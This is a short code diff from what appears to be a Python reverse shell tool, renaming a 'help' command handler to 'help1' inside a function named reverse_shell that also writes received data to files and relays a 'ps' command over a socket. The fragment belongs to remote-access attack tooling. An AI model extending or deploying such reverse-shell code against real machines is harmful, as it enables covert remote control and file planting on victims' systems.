@@ -96,8 +96,8 @@ def reverse_shell(conn):
                             break
                         file_to_write.write(bytes(data))
                     file_to_write.close()
-            elif "help" in command.lower():
-                help()
+            elif "help1" in command.lower():
+                help1()
                 continue
             elif "ps" in command.lower():
                 stdout = conn.recv(BUF_SIZE).decode(FORMAT)
